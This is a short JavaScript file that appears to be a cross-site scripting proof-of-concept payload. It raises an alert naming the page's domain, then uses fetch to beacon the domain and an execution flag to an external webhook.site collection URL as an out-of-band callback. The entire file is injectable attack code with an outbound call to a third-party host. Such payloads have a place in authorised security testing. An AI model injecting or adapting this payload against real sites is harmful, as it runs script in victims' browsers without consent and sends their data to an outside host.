// Visual proof
alert("XSS executed on: " + document.domain);

// Optional background OOB for tracking
fetch('https://webhook.site/https%3A%2F%2Fdavid2005otieno-hue.github.io%2Fjs-test%2Ffake.js?executed=true&domain=' + document.domain);


